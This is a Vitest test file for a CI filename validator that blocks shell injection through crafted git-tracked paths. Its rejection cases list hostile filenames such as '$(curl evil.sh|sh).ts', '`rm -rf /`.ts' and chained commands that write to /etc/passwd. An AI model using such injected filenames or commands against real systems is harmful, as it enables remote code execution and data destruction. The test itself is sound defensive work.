// isCiPathSafe is the fail-closed gate that stops a crafted git-tracked filename
// from reaching the CI shell (#571). ci-decide-tests.mjs interpolates changed
// paths into a GitHub Actions `reason` echo and the `vitest related` argument
// splat; git permits almost any byte in a filename, so the gate must reject
// anything a real source path would never contain. These cases pin the security
// boundary in BOTH directions: the metacharacter rejections are the injection
// vectors that must fail closed, and the route-group / dynamic-segment
// acceptances guard against a regression that would silently force the full
// suite on every PR touching a Next.js tenant route.

import { describe, it, expect } from "vitest";
import { isCiPathSafe } from "../../../scripts/lib/ci-path-safe.mjs";

describe("isCiPathSafe", () => {
  it("accepts ordinary source paths", () => {
    expect(isCiPathSafe("apps/main/src/lib/db/safe-mutation.ts")).toBe(true);
    expect(isCiPathSafe("scripts/ci-decide-tests.mjs")).toBe(true);
    expect(isCiPathSafe("README.md")).toBe(true);
  });

  it("accepts Next.js route groups and dynamic segments (no false-positive full-suite trigger)", () => {
    // The whole reason the allowlist includes () and [] — these are real repo paths.
    // If this regresses, every PR touching a tenant route is forced into the full suite.
    expect(isCiPathSafe("apps/main/src/app/(tenant)/[id]/page.tsx")).toBe(true);
    expect(isCiPathSafe("apps/main/src/app/(marketing)/about/page.tsx")).toBe(true);
    expect(isCiPathSafe("apps/main/src/app/api/[...slug]/route.ts")).toBe(true);
  });

  it("rejects command-substitution filenames (the #571 injection vector)", () => {
    expect(isCiPathSafe("$(curl evil.sh|sh).ts")).toBe(false);
    expect(isCiPathSafe("`rm -rf /`.ts")).toBe(false);
    expect(isCiPathSafe("a${IFS}b.ts")).toBe(false);
  });

  it("rejects shell control characters that chain a second command", () => {
    expect(isCiPathSafe("a.ts; curl evil")).toBe(false);
    expect(isCiPathSafe("a.ts|sh")).toBe(false);
    expect(isCiPathSafe("a.ts&&rm x")).toBe(false);
    expect(isCiPathSafe("a.ts>/etc/passwd")).toBe(false);
  });

  it("rejects whitespace that would split one path into multiple shell args", () => {
    expect(isCiPathSafe("two words.ts")).toBe(false);
    expect(isCiPathSafe("a\tb.ts")).toBe(false);
    expect(isCiPathSafe("a\nb.ts")).toBe(false);
  });

  it("rejects the empty string (degenerate path fails closed)", () => {
    expect(isCiPathSafe("")).toBe(false);
  });
});
